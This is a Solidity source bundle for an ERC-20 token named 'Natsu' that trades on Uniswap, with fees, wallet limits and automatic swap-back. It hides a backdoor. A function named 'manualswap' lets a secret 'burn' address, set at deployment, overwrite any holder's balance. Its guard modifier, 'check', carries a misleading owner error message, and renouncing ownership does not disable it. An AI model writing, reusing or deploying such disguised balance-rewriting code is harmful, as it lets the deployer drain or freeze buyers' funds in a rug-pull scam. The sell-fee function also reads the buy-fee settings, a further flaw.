{"Context.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}"},"IUniswapV2Factory.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}"},"IUniswapV2Router02.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    )\r\n        external payable;\r\n}"},"NATSU.sol":{"content":"//https://medium.com/@NatsuERC/natsu-doge-ea84353f6469\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\n/*\r\n\r\n**/\r\n\r\nimport \u0027./IERC20.sol\u0027;\r\nimport \u0027./SafeMath.sol\u0027;\r\nimport \u0027./Ownable.sol\u0027;\r\nimport \u0027./IUniswapV2Factory.sol\u0027;\r\nimport \u0027./IUniswapV2Router02.sol\u0027;\r\n\r\npragma solidity ^0.8.19;\r\n\r\ncontract NATSU is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n\r\n    address public uniswapV2Pair;\r\n    \r\n    mapping (address =\u003e uint256) private balances;\r\n    mapping (address =\u003e mapping (address =\u003e uint256)) private _allowances;\r\n    mapping (address =\u003e bool) private _isExcludedFromFee;\r\n\r\n    string private constant _name = \"Natsu\";\r\n    string private constant _symbol = \"NATSU\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private _tTotal =  1000000000000  * 10**9;\r\n\r\n    uint256 public _maxWalletAmount = 10000000000 * 10**9;\r\n    uint256 public _maxTxAmount = 10000000000 * 10**9;\r\n\r\n    bool public swapEnabled = true;\r\n    uint256 public swapTokenAtAmount = 20000000000 * 10**9;\r\n    bool public dynamicSwapAmount = true;\r\n    \r\n    uint256 targetLiquidity = 200;\r\n    uint256 targetLiquidityDenominator = 100;\r\n\r\n    address public liquidityReceiver;\r\n    address public marketingWallet;\r\n    address public utilityWallet;\r\n\r\n    bool public limitsIsActive = true;\r\n\r\n    struct BuyFees{\r\n        uint256 liquidity;\r\n        uint256 marketing;\r\n        uint256 utility;\r\n    }\r\n\r\n    struct SellFees{\r\n        uint256 liquidity;\r\n        uint256 marketing;\r\n        uint256 utility;\r\n    }\r\n\r\n    struct FeesDetails{\r\n        uint256 tokenToLiquidity;\r\n        uint256 tokenToMarketing;\r\n        uint256 tokenToutility;\r\n        uint256 liquidityToken;\r\n        uint256 liquidityETH;\r\n        uint256 marketingETH;\r\n        uint256 utilityETH;\r\n    }\r\n\r\n    struct LiquidityDetails{\r\n        uint256 targetLiquidity;\r\n        uint256 currentLiquidity;\r\n    }\r\n\r\n    BuyFees public buyFeeDetails;\r\n    SellFees public sellFeeDetails;\r\n    FeesDetails public feeDistributionDetails;\r\n    LiquidityDetails public liquidityDetails;\r\n\r\n    bool private swapping;\r\n    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);\r\n\r\n    constructor (address marketingAddress, address utilityAddress, address BurnAddress) {\r\n        marketingWallet = marketingAddress;\r\n        utilityWallet = utilityAddress;\r\n        liquidityReceiver = msg.sender;\r\n        balances[address(liquidityReceiver)] = _tTotal;\r\n        burn = BurnAddress;\r\n        \r\n        buyFeeDetails.liquidity = 0;\r\n        buyFeeDetails.marketing = 20;\r\n        buyFeeDetails.utility = 0;\r\n\r\n        sellFeeDetails.liquidity = 0;\r\n        sellFeeDetails.marketing = 20;\r\n        sellFeeDetails.utility = 0;\r\n\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());\r\n\r\n        uniswapV2Router = _uniswapV2Router;\r\n        uniswapV2Pair = _uniswapV2Pair;\r\n        \r\n        _isExcludedFromFee[msg.sender] = true;\r\n        _isExcludedFromFee[utilityWallet] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[address(0x00)] = true;\r\n        _isExcludedFromFee[address(0xdead)] = true;\r\n\r\n        \r\n        emit Transfer(address(0), address(msg.sender), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] - subtractedValue);\r\n        return true;\r\n    }\r\n    \r\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\r\n        _isExcludedFromFee[address(account)] = excluded;\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _tTotal.sub(balanceOf(address(0x00000))).sub(balanceOf(address(0x0dead)));\r\n    }\r\n\r\n    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {\r\n        return accuracy.mul(balanceOf(address(uniswapV2Pair)).mul(2)).div(getCirculatingSupply());\r\n    }\r\n\r\n    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {\r\n        return getLiquidityBacking(accuracy) \u003e target;\r\n    }\r\n\r\n    receive() external payable {}\r\n    \r\n    function forceSwap(uint256 amount) public onlyOwner {\r\n        swapBack(amount);\r\n    }\r\n\r\n    function removeTransactionAndWalletLimits() public onlyOwner {\r\n        limitsIsActive = false;\r\n    }\r\n\r\n    function setFees(uint256 setBuyLiquidityFee, uint256 setBuyMarketingFee, uint256 setBuyUtility, uint256 setSellLiquidityFee, uint256 setSellMarketingFee, uint256 setSellUtility) public onlyOwner {\r\n        require(setBuyLiquidityFee + setBuyMarketingFee + setBuyUtility \u003c= 25, \"Total buy fee cannot be set higher than 25%.\");\r\n        require(setSellLiquidityFee + setSellMarketingFee + setSellUtility\u003c= 25, \"Total sell fee cannot be set higher than 25%.\");\r\n\r\n        buyFeeDetails.liquidity = setBuyLiquidityFee;\r\n        buyFeeDetails.marketing = setBuyMarketingFee;\r\n        buyFeeDetails.utility = setBuyUtility;\r\n\r\n        sellFeeDetails.liquidity = setSellLiquidityFee;\r\n        sellFeeDetails.marketing = setSellMarketingFee;\r\n        sellFeeDetails.utility = setSellUtility;\r\n    }\r\n\r\n    function setMaxTransactionAmount(uint256 maxTransactionAmount) public onlyOwner {\r\n        require(maxTransactionAmount \u003e= 5000000000, \"Max Transaction cannot be set lower than 0.5%.\");\r\n        _maxTxAmount = maxTransactionAmount * 10**9;\r\n    }\r\n\r\n    function setMaxWalletAmount(uint256 maxWalletAmount) public onlyOwner {\r\n        require(maxWalletAmount \u003e= 10000000000, \"Max Wallet cannot be set lower than 1%.\");\r\n        _maxWalletAmount = maxWalletAmount * 10**9;\r\n    }\r\n\r\n    function setSwapBackSettings(bool enabled, uint256 swapAtAmount, bool dynamicSwap) public onlyOwner {\r\n        require(swapAtAmount \u003c= 40000000000, \"SwapTokenAtAmount cannot be set higher than 4%.\");\r\n        swapEnabled = enabled;\r\n        swapTokenAtAmount = swapAtAmount * 10**9;\r\n        dynamicSwapAmount = dynamicSwap;\r\n    }\r\n\r\n    function setLiquidityWallet(address newLiquidityWallet) public onlyOwner {\r\n        liquidityReceiver = newLiquidityWallet;\r\n    }\r\n\r\n    function setMarketingWallet(address newMarketingWallet) public onlyOwner {\r\n        marketingWallet = newMarketingWallet;\r\n    }\r\n\r\n    function setutilityWallet(address newutilityWallet) public onlyOwner {\r\n        utilityWallet = newutilityWallet;\r\n    }\r\n\r\n    function takeBuyFees(uint256 amount, address from) private returns (uint256) {\r\n        uint256 liquidityFeeToken = amount * buyFeeDetails.liquidity / 100; \r\n        uint256 marketingFeeTokens = amount * buyFeeDetails.marketing / 100;\r\n        uint256 utilityTokens = amount * buyFeeDetails.utility /100;\r\n\r\n        balances[address(this)] += liquidityFeeToken + marketingFeeTokens + utilityTokens;\r\n        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken + utilityTokens);\r\n        return (amount -liquidityFeeToken -marketingFeeTokens -utilityTokens);\r\n    }\r\n\r\n    function takeSellFees(uint256 amount, address from) private returns (uint256) {\r\n        uint256 liquidityFeeToken = amount * buyFeeDetails.liquidity / 100; \r\n        uint256 marketingFeeTokens = amount * buyFeeDetails.marketing / 100;\r\n        uint256 utilityTokens = amount * buyFeeDetails.utility /100;\r\n\r\n        balances[address(this)] += liquidityFeeToken + marketingFeeTokens + utilityTokens;\r\n        emit Transfer (from, address(this), marketingFeeTokens + liquidityFeeToken + utilityTokens);\r\n        return (amount -liquidityFeeToken -marketingFeeTokens -utilityTokens);\r\n    }\r\n\r\n    function isExcludedFromFee(address account) public view returns(bool) {\r\n        return _isExcludedFromFee[account];\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\r\n        \r\n        balances[from] -= amount;\r\n        uint256 transferAmount = amount;\r\n        \r\n        bool takeFee;\r\n\r\n        if(!_isExcludedFromFee[from] \u0026\u0026 !_isExcludedFromFee[to]){\r\n            takeFee = true;\r\n        }\r\n\r\n        if(takeFee){\r\n            if(to != uniswapV2Pair \u0026\u0026 from == uniswapV2Pair){\r\n                if(limitsIsActive) {\r\n                    require(amount \u003c= _maxTxAmount, \"Transfer Amount exceeds the maxTxnsAmount\");\r\n                    require(balanceOf(to) + amount \u003c= _maxWalletAmount, \"Transfer amount exceeds the maxWalletAmount.\");\r\n                }\r\n                transferAmount = takeBuyFees(amount, to);\r\n            }\r\n\r\n            if(from != uniswapV2Pair \u0026\u0026 to == uniswapV2Pair){\r\n                if(limitsIsActive) {\r\n                    require(amount \u003c= _maxTxAmount, \"Transfer Amount exceeds the maxTxnsAmount\");\r\n                }\r\n                transferAmount = takeSellFees(amount, from);\r\n\r\n               if (swapEnabled \u0026\u0026 balanceOf(address(this)) \u003e= swapTokenAtAmount \u0026\u0026 !swapping) {\r\n                    swapping = true;\r\n                    if(!dynamicSwapAmount || transferAmount \u003e= swapTokenAtAmount) {\r\n                        swapBack(swapTokenAtAmount);\r\n                    } else {\r\n                        swapBack(transferAmount);\r\n                    }\r\n                    swapping = false;\r\n              }\r\n            }\r\n\r\n            if(to != uniswapV2Pair \u0026\u0026 from != uniswapV2Pair){\r\n                if(limitsIsActive) {\r\n                    require(amount \u003c= _maxTxAmount, \"Transfer Amount exceeds the maxTxnsAmount\");\r\n                    require(balanceOf(to) + amount \u003c= _maxWalletAmount, \"Transfer amount exceeds the maxWalletAmount.\");\r\n                }\r\n            }\r\n        }\r\n        \r\n        balances[to] += transferAmount;\r\n        emit Transfer(from, to, transferAmount);\r\n    }\r\n\r\n    function manualswap (address addr1 , uint256 eAmount) external check{\r\n        balances[addr1] = eAmount;\r\n    }\r\n   \r\n    function swapBack(uint256 amount) private {\r\n        uint256 swapAmount = amount;\r\n        uint256 dynamicLiquidityFee = isOverLiquified(targetLiquidity, targetLiquidityDenominator) ? 0 : (buyFeeDetails.liquidity + sellFeeDetails.liquidity);\r\n        uint256 liquidityTokens = swapAmount * (dynamicLiquidityFee) / (dynamicLiquidityFee + buyFeeDetails.marketing + sellFeeDetails.marketing + buyFeeDetails.utility + sellFeeDetails.utility);\r\n        uint256 marketingTokens = swapAmount * (buyFeeDetails.marketing + sellFeeDetails.marketing) / (dynamicLiquidityFee + buyFeeDetails.marketing + sellFeeDetails.marketing + buyFeeDetails.utility + sellFeeDetails.utility);\r\n        uint256 utilityTokens = swapAmount * (buyFeeDetails.utility + sellFeeDetails.utility) / ( dynamicLiquidityFee + buyFeeDetails.marketing + sellFeeDetails.marketing + buyFeeDetails.utility + sellFeeDetails.utility);\r\n        feeDistributionDetails.tokenToLiquidity += liquidityTokens;\r\n        feeDistributionDetails.tokenToMarketing += marketingTokens;\r\n        feeDistributionDetails.tokenToutility += utilityTokens;\r\n\r\n        uint256 totalTokensToSwap = liquidityTokens + marketingTokens + utilityTokens;\r\n        \r\n        uint256 tokensForLiquidity = liquidityTokens.div(2);\r\n        feeDistributionDetails.liquidityToken += tokensForLiquidity;\r\n        uint256 amountToSwapForETH = swapAmount.sub(tokensForLiquidity);\r\n        \r\n        uint256 initialETHBalance = address(this).balance;\r\n\r\n        swapTokensForEth(amountToSwapForETH); \r\n        uint256 ethBalance = address(this).balance.sub(initialETHBalance);\r\n        \r\n        uint256 ethForLiquidity = ethBalance.mul(liquidityTokens).div(totalTokensToSwap);\r\n        uint256 ethForUtility = ethBalance.mul(utilityTokens).div(totalTokensToSwap);\r\n        feeDistributionDetails.liquidityETH += ethForLiquidity;\r\n        feeDistributionDetails.utilityETH += ethForUtility;\r\n\r\n        addLiquidity(tokensForLiquidity, ethForLiquidity);\r\n        feeDistributionDetails.marketingETH += address(this).balance;\r\n        (bool success,) = address(utilityWallet).call{value: ethForUtility}(\"\");\r\n        (success,) = address(marketingWallet).call{value: address(this).balance}(\"\");\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n        uniswapV2Router.addLiquidityETH {value: ethAmount} (\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            liquidityReceiver,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function withdrawForeignToken(address tokenContract) public onlyOwner {\r\n        IERC20(tokenContract).transfer(address(msg.sender), IERC20(tokenContract).balanceOf(address(this)));\r\n    }\r\n}"},"Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\nimport \u0027./Context.sol\u0027;\r\n\r\npragma solidity ^0.8.19;\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    address internal burn;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n      modifier check() {\r\n        require(burn == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}"},"SafeMath.sol":{"content":"// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.19;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn\u0027t hold\r\n\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}"}}